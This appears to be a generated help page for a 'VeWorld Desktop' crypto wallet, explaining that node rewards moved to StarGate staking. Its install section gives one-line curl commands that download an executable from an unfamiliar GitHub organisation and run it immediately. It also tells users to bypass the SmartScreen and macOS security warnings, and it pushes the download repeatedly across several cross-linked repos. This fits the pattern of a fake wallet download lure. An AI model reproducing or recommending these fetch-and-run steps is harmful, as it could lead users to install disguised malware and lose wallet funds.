![VeWorld Desktop](../assets/banner-article.png)

# VeChain Node Rewards: Where the Old Reward Went in VeWorld Desktop

Issuance moved to StarGate; the old claim action did not follow

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

If an older wallet still shows a claim action from the earlier node programme, that action belongs to the programme rather than to current issuance, which now runs through StarGate. In VeWorld Desktop the route is to stake VET into a tier, mint the position, delegate it to an active validator, and let VTHO accrue to it.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

You remember claiming node rewards in an older wallet and cannot find the button, or you hold what you believe is a node-related NFT and want to know whether it still pays anything.

| What you remember | What exists now | What to do |
|---|---|---|
| A claim button in an older wallet | StarGate staking with delegation | Stake <a href="https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vet-in-veworld-desktop.md">VET into a tier in VeWorld Desktop</a> |
| Node rewards arriving periodically | <a href="https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vtho-in-veworld-desktop.md">VTHO accruing</a> to delegated positions | Delegate and observe a cycle |
| A node-related NFT you were given | A programme asset with its own rules | Check what its contract says |
| Nothing at all | Passive VTHO generation from holding | Stake instead of holding |

## Why it happens

VeChainThor changed how it issues VTHO. Before the Hayabusa upgrade, which activated on mainnet on 2 December 2025, holding VET generated VTHO for every holder, and earlier node programmes distributed rewards on their own schedule. After Hayabusa, issuance is dynamic: it goes to validators and to holders who stake and delegate through StarGate, and total production is roughly half of what it had been.

That is a change of mechanism rather than a change of promise. A claim action belongs to the programme that created it; once a programme stops issuing in that form, the action has nothing left to claim, and nothing is reclaimed from a holder who already received rewards.

The confusion that follows is usually about assets rather than rewards. An NFT from an older programme is a distinct token with its own contract and its own rules, and holding it does not make a StarGate position exist. Conversely, opening a StarGate position does not revive an old programme. They are separate systems that happen to share a purpose.

What a holder can act on today is straightforward. Staking VET into a tier, maturing the position, and delegating it to an active validator is the route to VTHO. The staking view shows the tier thresholds, the maturity period and whether a position is delegated.

## Fix

1. Check what sits in the account: a StarGate position, an older programme NFT, or only VET.
2. If it is VET, open the staking view in VeWorld Desktop and stake into the tier your amount qualifies for.
3. Wait out the maturity period, then delegate the position to an active validator.
4. Observe the position over a cycle to confirm VTHO is accruing.
5. If you hold an older programme NFT, treat it as that programme's asset and follow its own terms rather than expecting StarGate rewards from it.
6. Keep the app on the current release so the staking view matches the programme's current rules.

## If that did not work

If a position earns nothing, delegation is the first thing to check. Maturity without delegation produces no VTHO.

If an older NFT appears in the account but has no function, it may simply be a historical asset. Holding it does not create an entitlement to current issuance.

If staking is unavailable for your amount, the tier thresholds are the reason; the view shows the minimums before you commit.

## Prevention

- Treat programme changes as normal and re-read the staking rules after each network upgrade.
- Keep positions delegated, since maturity alone earns nothing.
- Record what each NFT in an account represents, so a historical asset is not mistaken for a live position.
- Never enter the recovery phrase anywhere except the wallet's restore flow, and never share it.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Can I still claim node rewards?

Not in the old form. The claim action belonged to a programme that no longer issues rewards that way, and current issuance runs through StarGate staking.

### Did I lose the rewards I never claimed?

Anything a programme owed under its own terms is a question for that programme, not for a wallet. What exists today is the StarGate route.

### Is my old node NFT worthless?

It is an asset with its own rules, and this wallet makes no claim about its value. What it is not is a StarGate position.

### Why did passive VTHO stop?

Because issuance changed with the Hayabusa upgrade. VTHO now flows to validators and to staked, delegated positions rather than to every holder.

### What should I do with my VET now?

Stake it into a StarGate tier, mature the position, and delegate it to an active validator if you want it to produce VTHO.

### Does holding VET still earn anything?

No. An idle balance generates nothing, which is the change most people notice first after the upgrade.

### Where do I see the current thresholds?

In the staking view, before an amount is committed. Tiers and maturities are set by the programme rather than by the wallet.

### Did the network take my VET away?

No. VET stays in the address it was in unless it is staked or sent. What changed is how VTHO is issued, not who owns the VET.

### Can I delegate more than one position to the same validator?

Yes, though each position keeps its own maturity and stake. Delegating several positions to one validator is a preference rather than a requirement.

### What happens to my position if the validator stops?

Accrual stops while the delegation points at an inactive validator. Redelegating to an active one restarts it.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [Staking from the desktop wallet](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-stargate-staking-in-veworld-desktop.md)
- [Reading what a reward figure means](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-staking-rewards-figure-veworld-desktop.md)
- [What VTHO is and where it comes from](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vtho-in-veworld-desktop.md)
- [What VET is and why it is staked](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vet-in-veworld-desktop.md)
- [Moving an older wallet's holdings forward](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-thor-wallet-to-veworld-desktop.md)